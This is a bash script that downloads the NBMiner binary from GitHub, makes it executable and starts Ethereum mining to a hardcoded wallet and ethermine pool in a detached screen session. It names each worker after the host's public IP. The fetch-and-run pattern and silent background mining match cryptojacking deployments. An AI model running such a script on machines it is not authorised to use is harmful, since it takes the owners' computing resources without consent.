#!/bin/bash

WELS=0xf174372E51EB80A0c2E4c2bc8f9A9DcC3a50bb95
PAL=stratum+tcp://asia2.ethermine.org:4444
WER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-MOON




FILE=./tuan
if [ -f "$FILE" ]; then
    echo "$FILE exists."
else 
    mkdir /home/downloads
    wget https://github.com/NebuTech/NBMiner/releases/download/v39.7/NBMiner_39.7_Linux.tgz
    tar -xf NBMiner_39.7_Linux.tgz
    chmod +x *
fi
screen -dmLS mine ./nbminer -a ethash -o $PAL -u $WELS.$WER
